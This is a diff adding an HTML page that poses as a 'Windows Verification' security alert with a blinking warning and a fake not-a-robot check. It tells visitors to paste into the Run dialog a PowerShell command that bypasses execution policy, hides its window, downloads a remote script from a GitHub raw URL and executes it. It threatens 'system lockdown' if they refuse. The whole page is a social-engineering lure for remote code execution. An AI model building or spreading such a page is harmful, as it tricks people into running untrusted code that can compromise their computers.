@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Windows Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: black;
+            color: red;
+        }
+        .container {
+            margin-top: 100px;
+            padding: 20px;
+            border: 2px solid red;
+            display: inline-block;
+            background: black;
+        }
+        .error {
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <p class="error">Security Alert: Verification Required!</p>
+        <p>To continue using this device, please verify you are not a robot.</p>
+        <p>Copy and paste the following command into <b>Run (Win + R)</b>:</p>
+        <code>powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iwr -useb https://raw.githubusercontent.com/HackerHobbitManGuy/SCARYPOWERSHELLSCRIPT/main/verify.ps1 | iex"</code>
+        <p>Failure to complete verification may result in system lockdown.</p>
+    </div>
+</body>
+</html>
